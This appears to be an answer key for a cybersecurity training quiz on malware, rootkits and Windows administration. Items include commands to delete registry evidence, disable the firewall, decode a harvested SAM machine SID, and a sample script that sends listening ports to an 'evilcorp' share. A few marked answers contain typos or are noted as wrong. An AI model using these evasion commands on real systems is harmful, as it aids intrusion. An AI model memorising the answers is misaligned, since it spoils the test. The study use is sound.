6. You receive an email with this sus message: ?? ???????????????? ???????? ????????. ???????? ???? ????????????, ?????????? ?????? ???????? ?? ??????????????, ???????????????? ?????? 20000 Doge. What sort of malware is at play here? `Ransomware`

7. You access a linux box via netcat, port 4321. When you are on target, you get a process list, but don't see a netcat listener on port 4321. It appears that someone has modified the ps system binary, so that it hides the netcat listener in its output. What sort of rootkit is this indicative of? `user mode`

8. What sort of rootkit modifies device drivers and the kernel? `kernel mode`

9. Are rootkits necessarily malicious? `no`

    yes or no?

10. On their own, rootkits often: 

    A. act as droppers
    B. propagate through a network
    `C. hide programs and processes`
    `D. escalate privileges`
    E. deny access to a server
    `F. create backdoor(s) for persistent access`
    G. come into effect at a certain time
    
    Answer with all letters, in alpabetical order comma separated with a space, like: A, B, C, D

11. You are on a windows box. You get a process list and see this entry:

    This is most likely:
    
    A. spyware

    B. a worm

    `C. a trojan`

    D. ransomware

    E. a rootkit

    F. a keylogger

    G. adware

    Answer with one letter.


## Windows

### Powerhshell

1. what is the format for a powershell cmdlet?

    `A. verb>-noun>`

    B. object>-action>

    C. command>-action>

    D. action>-verb>
  
2. What command would you use to search for all commands that contain "logon" in their name:

    A. get-command -modulename "*logon*"

    B. get-command -name "*login*"

    C. get-command -name "logon*"

    D. get-command "*logon*"

    `E. get-command -name "*logon*"`

    (D isnt correct on here, but it actually is)

3. You're practicing your sweet powershell skills, but there's a 2nd freeze and your internet connection suddenly drops. You want to learn more about the "Enable-BitLocker" command, but "get-help" isn't quite giving you enough information. How can you modify your command to make it better? `Get-Help Enable-Bitlocker -Full`

4. What command would you use to display only the status of a service called "XblGameSave". Do not use aliases. `Get-Service XblGameSave | Select-Object Status`

5. Provide a command with Get-WMIObject to retrieve all properties for all processes using WQL. `Get-WmiObject -Query "Select * from Win32_Process"`

6. What cmdlet is the CIM equivalent of Get-WMIObject? `Get-CIMInstance`

7. You ran into a weird cmdlet in a script on target, called Export-Clixml, and want some more information on it. On your local box, you want to use a powershell command to get more information on it, because you like doing everything in powershell. What command can you use? Enter the FULL command: `Get-Help Export-Clixml`

8. You want to discover the aliases for get-process, because all of these keystrokes are wearing on your forearms. What command can you use to do this?

    `A. help get-process`

    B. alias get-process

    C. list-alias get-process

    D. get-help get-process

9. You are getting a process list, but want to view everything (properties, methods, objects) about the process objects. What command can you use to do this (enter the FULL command)? `Get-Process | Get-Member`

10. What do all wmi object names in powershell start with? `win32`

11. You want to use gwmi, but don't know what gwmi objects are available... what command can be used to do this? note: gwmi is an abbreviation for Get-WmiObject. Provide the answer as all letters applicable comma separated with no spaces.

    A. gwmi | gm

    `B. gwmi | where {$_.name -like "Win32*"} | select name`

    `C. gwmi | where {$_.name -match "^Win32"} | select name`

    D. gwmi *

12. You are on a target box in a PS shell and your cim cmdlets aren't working. What is most likely the reason?

    `A. the system is running an older version of powershell (ex: powershell 1.0)`

    B. you need internet access to use cim

    C. cim isn't available on windows machines

    D. the firewall is blocking cim because it uses DCOM, which is often blocked by networking equipment

13. You just used some sweet powershell skills to get the status of the "w32time" service. Now you want to invoke a method on it ("it" being the "status" property of the service object). What are some ways to do this? Provide the answer as all letters applicable in alphabetical order comma separated with no spaces.

    `A. (Get-service | where name -eq "w32time" | select status).<method name>()`  
    
    B. $<object name> = Get-service | where name -eq "w32time" | select status $<object name>.<method name>()
    
    C. invoke-method <method name>(Get-service | where name -eq "w32time" | select status)
    
    D. Get-service | where name -eq "w32time" | select status | invoke-method
    
    E. <object name> = Get-service | where name -eq "w32time" | select status <object name>.<method name>()

14. You are writing a script and want to get ONLY the pid value of winlogon process:

    A. ps winlogon | select processid
    
    B. ps winlogon | select id
    
    `C. (ps winlogon).id`  
    
    D. (ps winlogon).processid
    
15. You're on target, and run a tasklist... you find a task that is running a PS script. Inside the script you see this:

    `get-nettcpconnection | where-object {$_.state -eq "Listen"} | select name,instanceID,localaddress,localport,owningprocess,remoteaddress,remoteport  | format-list 
    | out-file \\tyrell\evilcorp\hit_these.txt`
    
    What is this command doing!? Choose the BEST, most accurate answer!

    A. sending a list of listening ports on tyrell's machine to the evilcorp server
    
    `B. sending a list of listening ports on the target's box to a mounted share`  
    
    C. sending a list of listening ports on the target's box to tyrell's evilcorp database
    
    D. sending a list of listening ports on the target's box to a local file*
  
16. You import a csv file using this command:

    `$csv_content = import-csv "C:\powershell\advanced_powershell\practice lab\section3\testfile.csv"`
    
    How can you invoke a method on this csv object, converting it to a string?

    A. invoke-method $csv_content -method-name ToString
    
    B. csv_content.ToString()
    
    C. invoke-method csv_content -method-name ToString
    
    `D. $csv_content.ToString()`  

### Kernel and Registry

1. What is the executable that provides the fundamental kernel mechanisms? `ntoskrnl.exe`

2. Which of the following are core kernel functions?

    Format: Alphabetical list of letters, comma separated, no spaces (A,B,C)

    A. I/O manager

    `B. Thread Scheduling`

    C. Event Tracing

    D. Cache Manager

    `E. Interrupt Dispatching`

3. Which mode does OS code run in? `Kernel Mode`

4. (T/F) Read-only pages can be written to in kernel mode. `F`

5. You are using MS Paint to create a "high quality" Bill Gates meme to share with your fellow SEP friends. Which mode (user mode or kernel mode) would you expect the CPU to spend more time running in? `Kernel Mode`

6. What are the five registry hives? `HKCC,HKCR,HKCU,HKLM,HKU`

7. Which registry value type contains 32-bit numbers? `REG_DWORD`

8. Write a CMD command to query the run subkey under HKLM. Use the full path to the key starting with HKLM\Software\Microsoft `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

9. You previously made a file called C:\Users\coolmeme.jpg using MS Paint, and now wish to remove evidence that you were slacking off. This file path is contained in the File1 value within the paint recent file list. Write a CMD command that will delete ONLY the value containing the evidence. `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Paint\Recent File List" /v File1`

    Use the full path to subkey beginning with a root key

10. An administrator suspects that you spent your day making dank memes in MS Paint instead of working on a SEP quiz. They wish to use their forensic skills to see what files you have recently opened in Paint on your Windows 10 workstation. Which registry subkey should they look into? `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Paint\Recent File List`

    Format: Full path to subkey beginning with a root key

### Command Shell and Filesystems

1. What two characters can be used at the end of most windows commands to get help? `/?`

2. What windows command is used without arguments to list current environment variables? `set`

3. What line can be placed at the top of a batch file to prevent printing commands as they are executed? `echo off`

4. True or False: NTFS stores file timestamps in UTC `true`

5. What WMI action obtains all details for a particular alias? `list`

6. What WMI alias is used for management of user account information? `useraccount`

7. What option is used in a PsExec command to run the remote process in the System account? `-s`

### `Boot and Logon`

1. In a BIOS Windows 7 system, what executable is the operating system loader that is responsible for loading the kernel? Provide only the filename. `winload`

2. In Windows Vista+, boot configurations are maintained in the BCD. What plain text file in Windows XP contains the boot configurations? Provide the file name and extension only. `boot.ini`

3. What is the process name in Windows that is responsible for verifying credentials on login? This process also hosts the Local Security Authority. `lsass`

4. By default, the ______ is Ctrl+Alt+Del. No application can intercept this or prevent Winlogon from receiving it. `SAS`

5. Provide the command to enumerate the boot configuration of a system using BCD. `BCDEdit /enum`

### `Windows Process`

1. What switch for the TaskList command can control the output format? Provide only the switch. `FO`

2. What TaskList filter can be used to filter processes by loaded dlls? Provide only the filter name (not the switch). `MODULES`

3. What TaskList filter can be used to filter processes based on filename? Provide only the filter name (not the switch). `IMAGENAME`

4. Provide a pslist command that shows process information including thread and memory detail for only PID 2330. `pslist -x 2330`

5. Provide a pslist command to show all processes on 192.168.10.10 in tree format. The login to this machine is user1/pass1.
Provide flags/arguments in the following order: target IP, username, password, other options. `pslist \\192.168.10.10 -u user1 -p pass1 -t`

6. Using Sysinternals listdlls utility, provide a command to list processes that have loaded mscvr.dll. `listdlls -d mscvr.dll`

7. In the PE file format, what is the Machine Type value for IMAGE_FILE_MACHINE_AMD64? This indicates that an image file is intended for the x64 CPU type. Provide the answer as a 4-digit hexadecimal prefixed with 0x. `0x8664`

    Resource - https://docs.microsoft.com/en-us/windows/win32/debug/pe-format

8. At what offset in the COFF File Header is the TimeDateStamp field located? Provide the number only. `4`

    Resource - https://docs.microsoft.com/en-us/windows/win32/debug/pe-format

### Windows Services

1. Provide the command with sc that gets the current status of the WinRM service. `sc query WinRM`

2. Provide the command with sc to obtain the binary path of the SamSs service. `sc qc SamSs`

3. What psservice command parameter can be used to set the start type of a service? `setconfig`

4. What psservice command parameter can be used to show services dependent of the one specified? `depend`

### `Networking and Name Resolution`

1. What is the default port for SMB? `445`

2. What is the default port for NetBIOS session services? `139`

3. What Windows netstat option displays associated executable names? `-b`

4. What Windows netstat option displays the current routing table? `-r`

5. True or False: When resolving a name, Windows will perform a local NetBIOS broadcast request before contacting the configured DNS server. `True`

6. What is the hex suffix of NetBIOS names for the domain master browser? Answer with a two-digit hex number like 0x00 `ox1B`

### Users and SIDs

1. What is the RID in the SID S-1-5-21-2431887262-3736743497-1433179608-1001? `1001`

2. What is the default RID of the built-in administrator account? `500`

3. What user account is associated with the SID S-1-5-21-2431887262-3736743497-1433179608-502? `krbtgt`

4. What WMI alias can be used to get SIDs for users? `useraccount`

5. What registry key contains the machine SID? Provide the registry key with abbreviated hive (HKLM, HKCU, HKU, etc) and backslashes. `HKLM\SECURITY\SAM\Domains\Account`

6. You have harvested the value 9EA7F390492EBADED8956C55 from the V value of the registry key HKLM\SECURITY\SAM\Domains\Account. Decode this value and provide the resulting machine SID. `S-1-5-21-2431887262-3736743497-1433179608`

    `NOTES`:
    - The machine SID is stored in a raw-bytes form in the registry. To convert it into the more common numeric form, one interprets it as three little endian 32-bit integers, converts them to decimal, and add hyphens between them.

    |Example  |2E,43,AC,40,C0,85,38,5D,07,E5,3B,2B  |
    |--|--|
    | 1) Divide the bytes into 3 sections: | 2E,43,AC,40 - C0,85,38,5D - 07,E5,3B,2B |
    | 2) Reverse the order of bytes in each section: | 40,AC,43,2E - 5D,38,85,C0 - 2B,3B,E5,07 |
    | 3) Convert each section into decimal: | 1085031214 - 1563985344 - 725345543 |
    | 4) Add the machine SID prefix: | S-1-5-21-1085031214-1563985344-725345543 |

    `Question`:
    |Question |9E,A7,F3,90,49,2E,BA,DE,D8,95,6C,55  |
    |--|--|
    | 1) Divide the bytes into 3 sections: | 9E,A7,F3,90 - 49,2E,BA,DE - D8,95,6C,55  |
    | 2) Reverse the order of bytes in each section: | 90,F3,A7,9E - DE,BA,2E,49 - 55,6C,95,D8 |
    | 3) Convert each section into decimal: | 2431887262 - 3736743497 - 1433179608 |
    | 4) Add the machine SID prefix: | `S-1-5-21-2431887262-3736743497-1433179608`|

### Active Directory

1. What is the lowest-level object in Active Directory that you can delegate authority to? `ou`

2. What is the Active Directory term for a group of IP subnets connected at high speed? I.E. co-located at the same physical location? `site`

3. In cmd.exe, what command can be used to gather information about computers in a domain? `dsquery computer`

4. What Powershell cmdlet can be used to add an Active Directory user? `New-ADUser`

### `Permissions and ACLs`

1. What windows command is used to review ACLs? `CACLS`

2. What basic NTFS permission grants all permissions to a user or group? `full control`

3. You have created a new folder on your Windows 7 desktop. You run icacls and find that the new folder is already populated with permissions in its ACL. Are these permissions inherited or explicit? `inherited`

4. Provide a command using icacls that grants only read and write permission to the directory C:\share\docs for the user "sep". `icacls C:\share\docs /grant sep:(R,W)`

### `Windows Firewall`

1. Windows Firewall was first available in Windows `XP`.

2. Windows Firewall uses `profiles` to determine firewall behavior. Which profile is most likely to be in use by a laptop connected to public wifi? `public`

3. What netsh command would you use to view the current firewall profile configuration on a Windows 7 host? `netsh advfirewall show currentprofile`

4. How would you turn off the firewall on a Windows XP host using netsh? `netsh firewall set opmode disable`

### Auditing

1. What command is used to discover which users are being audited? `AuditPol /List /User`

2. What command is used to determine how user "Edna" is being audited? `auditpol /get /user:Edna /category:`*

3. What command is used to determine how a user is being audited? (use `"<username>"` in the flag) `auditpol /get /user:<username> /category:`*

4. What command do you use to list basic auditing categories? `auditpol /list /category`

5. How would you list all auditpol categories, and their correlating subcategories: `auditpol /list /subcategory:`*

6. How do you use auditpol to get the SID for user "Ned"? `auditpol /list /user:ned /v`

7. What command do you use to list GUID's for all audit policy categories? `AuditPol /List /Category /V`

8. For user "Milhouse," what command would you use to add auditing for failure to logon locally? `auditpol /set /user:Milhouse /subcategory:"logon" /include /failure:enable`

### Windows Protection Mechanisms

1. Which of the following is protected by both Windows Resource Protection and Windows File Protection? `Files`

    Enter one of the following:

    Files
    Folders
    Registries

2. True or false: In Windows 10, ASLR randomizes the location of important DLLs in memory. `TRUE`

3. True or false: Applications cannot run code from the default process stack but still can run code from the default process heap when DEP is enabled. `FALSE`

4. To accomplish a Windows Resource Protection scan, what command line syntax should be used? `sfc /scannow`